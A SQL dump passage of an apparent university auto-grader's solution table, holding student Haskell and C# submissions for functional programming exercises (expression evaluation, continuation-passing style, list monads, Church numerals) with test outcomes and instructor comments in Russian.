(4312, 111, '12206137', '2012-11-28 18:17:12', 1, 'data Expr = Var String | N Integer | Add Expr Expr | Mult Expr Expr\r\n\r\n\r\n\r\nfind val ((x,res):xs)\r\n\r\n    | x == val = res\r\n\r\n    | otherwise = find val xs\r\n\r\n\r\n\r\neval expr vals =\r\n\r\n    case expr of\r\n\r\n        Var x -> find x vals\r\n\r\n        N n -> n\r\n\r\n        Add a b -> eval a vals + eval b vals\r\n\r\n        Mult a b -> eval a vals * eval b vals\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4313, 112, '12206137', '2012-11-28 18:17:31', 1, 'data Expr =\r\n\r\n    Var String\r\n\r\n  | N Integer\r\n\r\n  | Add Expr Expr\r\n\r\n  | Mult Expr Expr\r\n\r\n  | Let String Integer Expr\r\n\r\n\r\n\r\nfind val ((x,res):xs)\r\n\r\n    | x == val = res\r\n\r\n    | otherwise = find val xs\r\n\r\n\r\n\r\neval expr vals =\r\n\r\n    case expr of\r\n\r\n        Var x -> find x vals\r\n\r\n        N n -> n\r\n\r\n        Add a b -> eval a vals + eval b vals\r\n\r\n        Mult a b -> eval a vals * eval b vals\r\n\r\n        Let var val e -> eval e ((var,val) : vals)\r\n', '<br/>Тесты успешно пройдены!'),
(4314, 113, '12206137', '2012-11-28 18:17:49', 1, 'sum_cps [] f = f 0\r\n\r\nsum_cps (x:xs) f = sum_cps xs (y -> f (x+y))\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4315, 115, '44060', '2012-11-28 18:28:45', 0, 'f xs = [i+j+k | i<-find (<5) xs, j<-find (>10) xs, k<-find (/=7) xs]\r\n		where\r\n			find cond [] = []\r\n			find cond (x:xs) = if cond x then [x] else find cond xs', '<br/>Тесты успешно пройдены!'),
(4316, 115, '44060', '2012-11-28 18:30:01', 1, 'f xs = (do i<-find (<5) xs; j<-find (>10) xs; k<-find (/=7) xs; [i+j+k])\r\n		where\r\n			find cond [] = []\r\n			find cond (x:xs) = if cond x then [x] else find cond xs', '<br/>Тесты успешно пройдены!'),
(4317, 115, '12206137', '2012-11-28 18:34:52', 1, 'find cond [] = []\r\n\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\n\r\n\r\n\r\nf list = [x+y+z | x <- find (<5) list, y <- find (>10) list, z <- find (/=7) list]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4318, 115, '985727', '2012-11-28 18:44:16', 0, '\r\nfind cond [] = []\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\nmy [] xs ys = []\r\nmy xs [] ys = []\r\nmy xs ys [] = []\r\nmy xs ys zs = [xs!!0 + ys!!0 + zs!!0]\r\nf xs = my (find (<5) xs) (find (>10) xs) (find (/=5) xs)', 'Выражение имеет неправильное значение: f [7, 6, 4, 3, 20, 15, 9] '),
(4319, 113, '6774563', '2012-11-28 18:44:25', 1, '  --- Нет, это не совсем по условию. Формально требования выполнены, но это не continuation passing style,\r\n  --- тем не менее. Попробуйте исправить, пожалуйста.\r\n  --- Подсказка: как накапливающий параметр должен использоваться параметр cp и в нем копиться _функция_\r\n--sum_cps [] cp = cp 0\r\n--sum_cps [x] cp = cp x\r\n--sum_cps (x:x'':xs) cp = sum_cps ((x+x''):xs) cp\r\n\r\n-- Тогда явно вот так\r\nsum_cps [] cp = cp 0\r\nsum_cps (x:xs) cp = sum_cps xs (cp.(+x))\r\n   --- Ок, замечательно!\r\n', '<br/>Тесты успешно пройдены!'),
(4320, 115, '985727', '2012-11-28 18:46:00', 1, 'find cond [] = []\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\nmy [] xs ys = []\r\nmy xs [] ys = []\r\nmy xs ys [] = []\r\nmy xs ys zs = [xs!!0 + ys!!0 + zs!!0]\r\nf xs = my (find (<5) xs) (find (>10) xs) (find (/=7) xs)', '<br/>Тесты успешно пройдены!'),
(4321, 118, '12206137', '2012-11-28 18:53:08', 1, 'find cond (x:xs) = if cond x then (x, xs) else find cond xs\r\n\r\n\r\n\r\n(>>>) f1 f2 x =\r\n\r\n    f2 $ snd $ f1 x\r\n\r\n\r\n\r\nf = find (>3) >>> find (>3) \r\n', '<br/>Тесты успешно пройдены!'),
(4322, 114, '12206137', '2012-11-28 19:03:21', 1, 'triangle1 n = [1..n] >>= i -> [1..i]\r\n\r\n\r\n\r\ntriangle2 n =\r\n\r\n    do  i <- [1..n]\r\n\r\n        j <- [1..i]\r\n\r\n        [j]\r\n', '<br/>Тесты успешно пройдены!'),
(4323, 113, '532002', '2012-11-28 19:06:56', 1, 'sum_cps [] f = f 0\r\n\r\nsum_cps (x:xs) f = sum_cps xs (f.(+x))\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4324, 111, '383483', '2012-11-28 19:14:09', 1, 'data Expr = N Integer | Add Expr Expr | Mult Expr Expr | Var String\r\neval (Var vr) a = snd (head (filter (	 -> fst t == vr) a))\r\neval (N n) a = n\r\neval (Add a b) c = (eval a c) + (eval b c)\r\neval (Mult a b) c = (eval a c) * (eval b c)\r\n', '<br/>Тесты успешно пройдены!'),
(4325, 121, '12206137', '2012-11-28 19:20:31', 1, 'using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\nnamespace Work {\r\n\r\n    class Program {\r\n\r\n        static int fact_cps(int n, Func<int, int> cont) {\r\n\r\n            if (n <= 1) return cont(1);\r\n\r\n            else return fact_cps(n-1, x => cont (x*n));\r\n\r\n        }\r\n\r\n        public static void Main(string[] args) {\r\n\r\n            Console.WriteLine(fact_cps(5, x => x));\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(4326, 118, '533223', '2012-11-28 19:24:01', 1, 'g >>> f = g.snd.f\r\n\r\nfind cond (x:xs) = if cond x then (x, xs) else find cond xs\r\nf = find (>3) >>> find (>3)', '<br/>Тесты успешно пройдены!'),
(4327, 112, '383483', '2012-11-28 19:24:25', 1, 'data Expr = N Integer | Add Expr Expr | Mult Expr Expr | Var String | Let String Integer Expr\r\neval (Var vr) a = snd (head (filter (	 -> fst t == vr) a))\r\neval (N n) a = n\r\neval (Add a b) c = (eval a c) + (eval b c)\r\neval (Mult a b) c = (eval a c) * (eval b c)\r\neval (Let a b c) d = eval c ((a, b):d)', '<br/>Тесты успешно пройдены!'),
(4328, 18, '442421', '2012-11-28 19:40:16', 1, ' --- Чего-то у вас не то.. Вот такой пример не проходит\r\n ---   checkBrackets "[[]]" (выдает False)\r\n --- Попробуйте исправить, скажем до пятницы включительно.\r\n --- А я сейчас добавлю такой тест\r\n\r\n\r\n\r\ncheckBrackets x = checkBrackets'' [] x\r\n\r\ncheckBrackets'' e ('']'':xs) = replaceBracket (reverse e) ('')'':xs)\r\ncheckBrackets'' e (x:xs) = checkBrackets'' (e++[x]) xs\r\ncheckBrackets'' e [] = checkBrackets1 e\r\n\r\n\r\nreplaceBracket e x = replaceBracket'' [] e x\r\n\r\nreplaceBracket'' e (''['':es) x = checkBrackets (reverse e) && checkBrackets ((reverse (e++[''('']++es))++x) -- не хватало reverse\r\nreplaceBracket'' e1 (e:es) x = replaceBracket'' (e1++[e]) es x\r\nreplaceBracket'' e1 [] x = False\r\n\r\n\r\ncheckBrackets1 x = checkBrackets1'' x 0 0\r\n\r\ncheckBrackets1'' [] a b = a==b\r\ncheckBrackets1'' (''('':xs) a b = a>=b && checkBrackets1'' xs (a+1) b\r\ncheckBrackets1'' ('')'':xs) a b = a>=b && checkBrackets1'' xs a (b+1)\r\n', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(4329, 97, '442421', '2012-11-28 19:41:02', 1, ' --- Чего-то у вас не то.. Вот такой пример не проходит\r\n ---   checkBrackets "[[]]" (выдает False)\r\n --- Попробуйте исправить, скажем до пятницы включительно.\r\n --- А я сейчас добавлю такой тест\r\n\r\n\r\n\r\ncheckBrackets x = checkBrackets'' [] x\r\n\r\ncheckBrackets'' e ('']'':xs) = replaceBracket (reverse e) ('')'':xs)\r\ncheckBrackets'' e (x:xs) = checkBrackets'' (e++[x]) xs\r\ncheckBrackets'' e [] = checkBrackets1 e\r\n\r\n\r\nreplaceBracket e x = replaceBracket'' [] e x\r\n\r\nreplaceBracket'' e (''['':es) x = checkBrackets (reverse e) && checkBrackets ((reverse (e++[''('']++es))++x) -- не хватало reverse\r\nreplaceBracket'' e1 (e:es) x = replaceBracket'' (e1++[e]) es x\r\nreplaceBracket'' e1 [] x = False\r\n\r\n\r\ncheckBrackets1 x = checkBrackets1'' x 0 0\r\n\r\ncheckBrackets1'' [] a b = a==b\r\ncheckBrackets1'' (''('':xs) a b = a>=b && checkBrackets1'' xs (a+1) b\r\ncheckBrackets1'' ('')'':xs) a b = a>=b && checkBrackets1'' xs a (b+1)\r\n', '<br/>Тесты успешно пройдены!'),
(4330, 116, '5656962', '2012-11-28 19:42:55', 1, 'toInt expr = expr (x -> x+1) 0\r\n', '<br/>Тесты успешно пройдены!'),
(4331, 117, '5656962', '2012-11-28 19:43:14', 1, 'toInt expr = expr (x -> x+1) 0\r\n\r\n\r\n\r\ninc expr = f -> x -> f (expr f x)\r\n', '<br/>Тесты успешно пройдены!'),
(4332, 118, '383483', '2012-11-28 19:44:10', 1, 'f = find (>3) >>> find (>3)\r\n(>>>) f g = (	 -> g (snd (f t)))\r\nfind cond (x:xs) = if cond x then (x, xs) else find cond xs\r\n', '<br/>Тесты успешно пройдены!'),
(4333, 109, '6774563', '2012-11-28 19:46:13', 1, '﻿using System;\r\n\r\n\r\n\r\nnamespace task_29_1\r\n\r\n{\r\n\r\n    internal sealed class Program\r\n\r\n    {\r\n\r\n        public static void AllDiffLists(int n, int k)\r\n\r\n        {\r\n\r\n            AllDiffLists(n, k, x => false, () => {});\r\n\r\n        }\r\n\r\n\r\n\r\n        private static void AllDiffLists(int n, int k, Func<int, bool> used, Action print)\r\n\r\n        {\r\n\r\n            if (n == 0)\r\n\r\n            {\r\n\r\n                print();\r\n\r\n                Console.WriteLine();\r\n\r\n            }\r\n\r\n            else\r\n\r\n            {\r\n\r\n                for (int i = 1; i <= k; ++i)\r\n\r\n                {\r\n\r\n                    if (!used(i))\r\n\r\n                    {\r\n\r\n                        AllDiffLists(n-1, k,\r\n\r\n                            x => x == i || used(x),\r\n\r\n                            () =>\r\n\r\n                                {\r\n\r\n                                    Console.Write("{0} ", i);\r\n\r\n                                    print();\r\n\r\n                                });\r\n\r\n                    }\r\n\r\n                }\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        public static void Main(string[] args)\r\n\r\n        {\r\n\r\n            AllDiffLists(2, 3);\r\n\r\n            Console.ReadLine();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4334, 110, '6774563', '2012-11-28 19:46:50', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\nnamespace task_29_2\r\n\r\n{\r\n\r\n    // А вот это действительно полезно, пусть будет экстеншном\r\n\r\n    public static class EnumerableExtensiona\r\n\r\n    {\r\n\r\n        /// <summary>\r\n\r\n        /// Performs a search in <paramref name="source"/>. Returns first element \r\n\r\n        /// satisfying <paramref name="condition"/> or <paramref name="error"/> \r\n\r\n        /// evaluation result when <paramref name="source"/> does not contains elements\r\n\r\n        /// satisfying <paramref name="condition"/>\r\n\r\n        /// </summary>\r\n\r\n        /// <typeparam name="T"></typeparam>\r\n\r\n        /// <param name="source"></param>\r\n\r\n        /// <param name="condition">A function to test each element for a condition</param>\r\n\r\n        /// <param name="error">A function to be evaled when nothing found</param>\r\n\r\n        /// <returns></returns>\r\n\r\n        public static T Find<T>(this IEnumerable<T> source, Predicate<T> condition, Func<T> error)\r\n\r\n        {\r\n\r\n            foreach (T element in source)\r\n\r\n            {\r\n\r\n                if (condition(element))\r\n\r\n                {\r\n\r\n                    return element;\r\n\r\n                }\r\n\r\n            }\r\n\r\n            return error();\r\n\r\n        }\r\n\r\n    }\r\n\r\n\r\n\r\n    internal sealed class Program\r\n\r\n    {\r\n\r\n        public static void Main(string[] args)\r\n\r\n        {\r\n\r\n            var a = new[] {111, 50, 32, 19, 5};\r\n\r\n            Console.WriteLine(a.Find(x => x < 10, () => a.Find(x => x < 20, () => 20)));\r\n\r\n            Console.ReadLine();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4335, 121, '6774563', '2012-11-28 19:47:09', 1, '﻿using System;\r\n\r\n\r\n\r\nnamespace task_32_1\r\n\r\n{\r\n\r\n    internal sealed class Program\r\n\r\n    {\r\n\r\n        private static void FactCps(int n, Action<int> cp)\r\n\r\n        {\r\n\r\n            if (n < 2)\r\n\r\n            {\r\n\r\n                cp(1);\r\n\r\n                return;\r\n\r\n            }\r\n\r\n            FactCps(n-1, x => cp(x*n));\r\n\r\n        }\r\n\r\n\r\n\r\n        public static void Main(string[] args)\r\n\r\n        {\r\n\r\n            FactCps(4, x => \r\n\r\n                {\r\n\r\n                    Console.WriteLine(x);\r\n\r\n                    Console.ReadLine();\r\n\r\n                });\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4336, 115, '532002', '2012-11-28 19:50:46', 1, 'find cond [] = []\r\n\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\n\r\n\r\n\r\n\r\n\r\nf xs = let \r\n\r\n        ys = ((find (<5) xs):find (>10) xs:find (/=7) xs:[])\r\n\r\n       in if(elem [] ys) then [] else [sum(map head ys)] \r\n', '<br/>Тесты успешно пройдены!'),
(4337, 114, '532002', '2012-11-28 20:02:01', 1, 'triangle1 n = [1..n] >>= ( x -> [1..x] >>= ( y -> [y] ))\r\n\r\ntriangle2 n = do \r\n\r\ni <- [1..n]\r\n\r\nj <- [1..i]\r\n\r\n[j]\r\n', '<br/>Тесты успешно пройдены!'),
(4338, 121, '2118411', '2012-11-28 20:05:27', 1, 'using System;\r\n\r\nnamespace FPTask\r\n{\r\n    delegate UInt64 Func(UInt64 x);\r\n\r\n    class Program\r\n    {\r\n        static void Main()\r\n        {\r\n            Console.WriteLine(fact_cps(5, t=>t));\r\n        }\r\n\r\n         static UInt64 fact_cps(UInt64 n,  Func f)\r\n         {\r\n             if (n == 0)\r\n                 return f(1);\r\n             return fact_cps(n - 1, (t => f(t * n)));\r\n         }\r\n    }\r\n}', '<br/>Тесты успешно пройдены!'),
(4339, 111, '214982', '2012-11-28 20:11:10', 1, 'data Expr = N Integer | Var String | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\neval (Var x) [] = 0\r\neval (Var x) ((y,int):ys) = if x == y then int else eval (Var x) ys \r\neval (Add left right) y= eval left y + eval right y\r\neval (Mult left right) y= (eval left y) * (eval right y)\r\neval (N e) y = e  ', '<br/>Тесты успешно пройдены!'),
(4340, 111, '5477377', '2012-11-28 20:18:47', 1, 'data Expr = N Integer| Var String | Add Expr Expr| Mult Expr Expr \r\n\r\neval (N a) vs = a\r\neval (Var name) vs = snd (head (filter (x -> (fst x) == name) vs))\r\neval (Add a b) vs = (eval a vs) + (eval b vs)\r\neval (Mult a b) vs = (eval a vs) * (eval b vs)\r\n', '<br/>Тесты успешно пройдены!'),
(4341, 118, '532002', '2012-11-28 20:24:22', 1, 'find cond (x:xs) = if cond x then (x, xs) else find cond xs\r\n\r\ng >>> f = g.snd.f\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4342, 112, '5477377', '2012-11-28 20:25:09', 1, 'data Expr = N Integer| Var String | Add Expr Expr| Mult Expr Expr |Let String Integer Expr\r\n\r\neval (N a) vs = a\r\neval (Var name) vs = snd (head (filter (x -> (fst x) == name) vs))\r\neval (Add a b) vs = (eval a vs) + (eval b vs)\r\neval (Mult a b) vs = (eval a vs) * (eval b vs)\r\n\r\neval (Let name x a) vs = eval a ((name, x):vs)', '<br/>Тесты успешно пройдены!'),
(4343, 111, '5656962', '2012-11-28 20:26:15', 1, 'data Expr = Var String | N Integer | Add Expr Expr | Mult Expr Expr\r\n\r\n\r\n\r\neval (Add x y) list = (eval x list) + (eval y list)\r\n\r\neval (Mult x y) list = (eval x list)*(eval y list)\r\n\r\neval (Var x) list = find x list\r\n\r\neval (N x) list = x\r\n\r\n\r\n\r\nfind x (y:ys) = if x == fst y then snd y else find x ys\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4344, 112, '5656962', '2012-11-28 20:26:28', 0, '', 'Не удалось вычислить выражение "eval (Let [''x''] 10 (Mult (Var [''x'']) (Var [''y'']))) [([''y''], 2)]", проверьте правильность синтаксиса'),
(4345, 112, '5656962', '2012-11-28 20:26:37', 1, 'data Expr = Var String | N Integer | Add Expr Expr | Mult Expr Expr | Let String Integer Expr\r\n\r\n\r\n\r\neval (Add x y) list = (eval x list) + (eval y list)\r\n\r\neval (Mult x y) list = (eval x list)*(eval y list)\r\n\r\neval (Var x) list = find x list\r\n\r\neval (N x) list = x\r\n\r\neval (Let x const expr) list = eval expr ((x, const):list)\r\n\r\n\r\n\r\nfind x (y:ys) = if x == fst y then snd y else find x ys\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4346, 112, '214982', '2012-11-28 20:27:59', 1, 'data Expr = N Integer | Var String | Add Expr Expr | Mult Expr Expr | Let String Integer Expr deriving Show\r\n\r\neval (Var x) [] = 0\r\neval (Var x) ((y,int):ys) = if x == y then int else eval (Var x) ys \r\neval (Add left right) y= eval left y + eval right y\r\neval (Mult left right) y= (eval left y) * (eval right y)\r\neval (Let x int right) y = eval right ((x,int):y)\r\neval (N e) y = e\r\n', '<br/>Тесты успешно пройдены!'),
(4347, 113, '5477377', '2012-11-28 20:37:34', 2, 'sum_cps [x] f = f x\r\nsum_cps (x:xs) f = sum_cps ((x + head xs):tail xs) f\r\n   --- Нет, это, на самом деле, не по условию.. Дополнительные условия выполняются, но все равно,\r\n   --- это не continuation passing style. \r\n   --- continuation passing style - это когда мы используем параметр f, как накапливающий параметр,\r\n   --- в котором копим действия, которые надо сделать.\r\n   --- Давайте так, вы решите такую задачу: написать функцию sumsin_sps которая для данного n\r\n   --- вычисляет sin 1 + sin 2 + sin 3 + ... + sin n и при этом использует constinuation passing style.\r\n   --- И выложите ее сюда же, как решение этой задачи. И я ее тогда зачту. \r\n   --- Если будут вопросы, пишите.', '<br/>Тесты успешно пройдены!'),
(4348, 118, '442421', '2012-11-28 20:37:53', 1, 'find cond (x:xs) = if cond x then (x, xs) else find cond xs\r\n\r\nf1 >>> f2 =  f1.snd.f2\r\n\r\nf = find (>3) >>> find (>3) ', '<br/>Тесты успешно пройдены!'),
(4349, 117, '419046', '2012-11-28 20:54:55', 1, 'toInt church = church (+1) 0\r\n\r\ninc church = (f x -> f (church f x))\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4350, 113, '214982', '2012-11-28 21:04:13', 2, '{- Мне кажется, что эти решения абсолютно одинаковы, просто второе не проходит по признаку не вводить новых функций, скажите, в чем я не прав?)-}\r\n   --- Ну да, второе решение формально выполняет условия,но все равно,\r\n   --- это не continuation passing style. \r\n   --- continuation passing style - это когда мы используем параметр t, как накапливающий параметр,\r\n   --- в котором копим действия, которые надо сделать.\r\n   --- Давайте так, вы решите такую задачу: написать функцию sumsin_sps которая для данного n\r\n   --- вычисляет sin 1 + sin 2 + sin 3 + ... + sin n и при этом использует constinuation passing style.\r\n   --- Тут вы уже не сможете применить ваш прием с модификацией списка, и вам придется использовать настоящий\r\n   --- continuation passing style:) И вы выложите ее сюда же, как решение этой задачи, пожалуйста,\r\n   --- и я ее тогда зачту. Если будут вопросы, пишите.\r\nsumm [] s t = t s\r\nsumm (x:xs) s t = summ xs (s + x) t\r\nsum_cps2 x t = summ x 0 t\r\n\r\nsum_cps [x] t = t x \r\nsum_cps (x:y:xs) t = sum_cps ((x+y):xs) t', '<br/>Тесты успешно пройдены!'),
(4351, 111, '374969', '2012-11-28 21:05:12', 0, 'import Maybe\r\n\r\ndata Expr = Var String | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\neval (N a)      _   = a\r\neval (Add a b)  prm = eval a prm + eval b prm\r\neval (Mult a b) prm = eval a prm * eval b prm\r\neval (Var nm)   prm = (snd.fromJust)(lookup nm prm)', 'Не удалось вычислить выражение "eval (Add (Var [''x'']) (Mult (Var [''y'']) (N 3))) [([''x''], 5), ([''y''], 8)]", проверьте правильность синтаксиса'),
(4352, 114, '5477377', '2012-11-28 21:08:36', 1, 'triangle1 n = [1..n] >>= (x -> [1..x])\r\n\r\ntriangle2 n = do\r\n     x <- [1..n]\r\n     y <- [1..x]\r\n     return y\r\n', '<br/>Тесты успешно пройдены!'),
(4353, 111, '374969', '2012-11-28 21:13:38', 0, 'import Data.Maybe\r\n\r\ndata Expr = Var String | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\neval (N a)      _   = a\r\neval (Add a b)  prm = eval a prm + eval b prm\r\neval (Mult a b) prm = eval a prm * eval b prm\r\neval (Var nm)   prm = (snd.fromJust)(lookup nm prm)', 'Не удалось вычислить выражение "eval (Add (Var [''x'']) (Mult (Var [''y'']) (N 3))) [([''x''], 5), ([''y''], 8)]", проверьте правильность синтаксиса'),
(4354, 118, '419046', '2012-11-28 21:14:25', 1, 'find cond (x:xs) = if cond x then (x, xs) else find cond xs\r\n\r\na >>> b = b.snd.a\r\n\r\nf = find (>3) >>> find (>3)  \r\n', '<br/>Тесты успешно пройдены!'),
(4355, 118, '5656962', '2012-11-28 21:17:24', 1, 'find cond (x:xs) = if cond x then (x, xs) else find cond xs\r\n\r\n\r\n\r\n(>>>) find1 find2 = list -> find2 (snd (find1 list))\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(4356, 112, '374969', '2012-11-28 21:20:25', 0, 'import Data.Maybe\r\n\r\ndata Expr = Var String | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\neval (N a)      _   = a\r\neval (Add a b)  prm = eval a prm + eval b prm\r\neval (Mult a b) prm = eval a prm * eval b prm\r\neval (Var nm)   prm = fromJust (lookup nm prm)', 'Не удалось вычислить выражение "eval (Let [''x''] 10 (Mult (Var [''x'']) (Var [''y'']))) [([''y''], 2)]", проверьте правильность синтаксиса'),
(4357, 111, '374969', '2012-11-28 21:21:04', 1, 'import Data.Maybe\r\n\r\ndata Expr = Var String | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\neval (N a)      _   = a\r\neval (Add a b)  prm = eval a prm + eval b prm\r\neval (Mult a b) prm = eval a prm * eval b prm\r\neval (Var nm)   prm = fromJust (lookup nm prm)', '<br/>Тесты успешно пройдены!'),
(4358, 115, '442421', '2012-11-28 21:21:34', 1, '\r\nfind cond [] = []\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\n\r\nf x = f1 (find (<5) x) x\r\n\r\nf1 [] x = []\r\nf1 a x = f2 a (find (>10) x) x  \r\nf2 a [] x = []\r\nf2 a b x = f3 a b (find (/=7) x)\r\nf3 a b [] = []\r\nf3 a b c = [sum (concat [a,b,c])] \r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4359, 116, '442421', '2012-11-28 21:26:54', 1, 'toInt church = church (1 + ) 0', '<br/>Тесты успешно пройдены!'),
(4360, 112, '374969', '2012-11-28 21:36:31', 1, 'import Data.Maybe\r\n\r\ndata Expr = Var String | N Integer | Add Expr Expr | Mult Expr Expr | Let String Integer Expr deriving Show\r\n\r\neval (N a)            _   = a\r\neval (Add a b)        prm = eval a prm + eval b prm\r\neval (Mult a b)       prm = eval a prm * eval b prm\r\neval (Var nm)         prm = fromJust (lookup nm prm)\r\neval (Let nm vl expr) prm = eval expr ((nm, vl):prm)', '<br/>Тесты успешно пройдены!'),
(4361, 117, '442421', '2012-11-28 21:37:11', 1, 'toInt church = church (1 + ) 0\r\n\r\ninc = \r\n -> f -> x -> f (n f x)', '<br/>Тесты успешно пройдены!'),
(4362, 114, '214982', '2012-11-28 21:38:45', 1, 'triangle1 n = [1..n] >>= (\r\n -> [x|x <- [1..n]])\r\n\r\ntriangle2 n = do\r\n        i <- [1..n]\r\n        y <- [x|x <- [1..i]]\r\n        return y', '<br/>Тесты успешно пройдены!'),
(4363, 118, '5477377', '2012-11-28 21:47:35', 1, 'h >>> g = x -> g (snd (h x))\r\n\r\nfind cond (x:xs) = if cond x then (x, xs) else find cond xs\r\n\r\nf = find (>3) >>> find (>3)', '<br/>Тесты успешно пройдены!'),
(4364, 113, '5772638', '2012-11-28 22:06:24', 1, 'sum_cps [] f=f 0\r\nsum_cps (x:xs) f= sum_cps xs (	->f(t+x))', '<br/>Тесты успешно пройдены!'),
(4365, 114, '374969', '2012-11-28 22:15:38', 1, 'triangle1 n = [1..n] >>= x -> [1..x] >>= y -> [y]\r\ntriangle2 n = do {x <- [1..n]; y <- [1..x]; return y}', '<br/>Тесты успешно пройдены!'),
(4366, 114, '5772638', '2012-11-28 22:33:16', 1, 'triangle1 n =[1..n]>>=(x->[1..x])\r\n\r\ntriangle2 n = do\r\n               x<-[1..n]\r\n               return [1..x]\r\n   --- Не совсем правильно, потому что return нельзя писать для списка. Но ОК, засчитано.\r\n', 'Выражение имеет неправильное значение: triangle2 3'),
(4367, 115, '214982', '2012-11-28 22:42:03', 1, 'find cond [] = []\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\n\r\nf x = let z = (find (<5) x) in let ul = (find (>10) x) in let il = (find (/=7) x) in \r\n		if ([] == z || [] == ul || [] == il) then [] else [head z + head ul + head il]', '<br/>Тесты успешно пройдены!'),
(4368, 115, '5772638', '2012-11-28 22:53:23', 0, '\r\nf xs=  if (find (<5) xs==[]||find (>10) xs==[]||find (/=7) xs==[]) then []\r\n         else [sum((find (<5) xs)++( find (>10) xs)++(find (/=7) xs) )]', 'Не удалось вычислить выражение "f [7, 6, 4, 3, 20, 15, 9] ", проверьте правильность синтаксиса'),
(4369, 115, '5772638', '2012-11-28 22:53:54', 1, 'find cond [] = []\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\n\r\nf xs=  if (find (<5) xs==[]||find (>10) xs==[]||find (/=7) xs==[]) then []\r\n         else [sum((find (<5) xs)++( find (>10) xs)++(find (/=7) xs) )]\r\n', '<br/>Тесты успешно пройдены!'),
(4370, 115, '5477377', '2012-11-28 23:02:43', 0, 'find cond [] = []\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\n\r\nf x = find (/=0) ((sum (head ((find (x -> (length x) == 3) (((find (<5) x)++(find (>10) x)++(find (/=7) x)):[])) ++ [[0]]))):[])	\r\n', '<br/>Тесты успешно пройдены!'),
(4371, 115, '5477377', '2012-11-28 23:02:44', 1, 'find cond [] = []\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\n\r\nf x = find (/=0) ((sum (head ((find (x -> (length x) == 3) (((find (<5) x)++(find (>10) x)++(find (/=7) x)):[])) ++ [[0]]))):[])	\r\n', '<br/>Тесты успешно пройдены!'),
(4372, 116, '374969', '2012-11-28 23:07:06', 1, 'toInt f = f (+1) 0', '<br/>Тесты успешно пройдены!'),
(4373, 115, '51559263', '2012-11-28 23:12:29', 1, 'find cond [] = []\r\n\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\n\r\n\r\n\r\nf xs \r\n\r\n   | f5 == [] || f7 == [] || f10 == [] = []\r\n\r\n   | otherwise = return ( sum ( f5 ++ f7 ++ f10 ) )\r\n\r\n   where \r\n\r\n	 f5 = find (<5) xs\r\n\r\n	 f10 = find (>10) xs\r\n\r\n	 f7 = find (/=7) xs\r\n', '<br/>Тесты успешно пройдены!'),
(4374, 117, '5772638', '2012-11-28 23:18:15', 1, 'inc cond=(f x->f(cond))\r\n   --- Тоже, идея менее правильная, но не совсем то.. Но засчитано. ', 'Не удалось вычислить выражение "let c3 f x = f (f x) in toInt (inc c3)", проверьте правильность синтаксиса'),
(4375, 117, '374969', '2012-11-28 23:20:44', 1, 'toInt f = f (+1) 0\r\n\r\ninc ff = f x -> f (ff f x)', '<br/>Тесты успешно пройдены!'),
(4376, 118, '374969', '2012-11-28 23:41:09', 0, '(>>>) f g = g.snd.f', 'Не удалось вычислить выражение "let f = find (>3) >>> find (>3) in f [1, 3, 5, 2, 20, 25, 2]", проверьте правильность синтаксиса'),
(4377, 118, '374969', '2012-11-28 23:44:26', 1, '(>>>) f g = g.snd.f\r\n   --- Тут подразумевалось, что find вы тоже должны написать, поэтому не компилируется', 'Не удалось вычислить выражение "let f = find (>3) >>> find (>3) in f [1, 3, 5, 2, 20, 25, 2]", проверьте правильность синтаксиса'),
(4378, 116, '5477377', '2012-11-29 00:12:24', 1, 'toInt f = f (+1) 0', '<br/>Тесты успешно пройдены!'),
(4379, 118, '63706456', '2012-11-29 06:28:32', 0, '(f >>> g) ls = let 	(l,r) = f ls \r\n			(h,t) = g r in \r\n			(l,(h:t))\r\n\r\n', 'Не удалось вычислить выражение "let f = find (>3) >>> find (>3) in f [1, 3, 5, 2, 20, 25, 2]", проверьте правильность синтаксиса'),
(4380, 118, '63706456', '2012-11-29 06:28:54', 0, '(f >>> g) ls = let 	(l,r) = f ls \r\n			(h,t) = g r in \r\n			(l,(h:t))\r\n\r\nfind cond (x:xs) = if cond x then (x,xs) else find cond xs', 'Выражение имеет неправильное значение: let f = find (>3) >>> find (>3) in f [1, 3, 5, 2, 20, 25, 2]'),
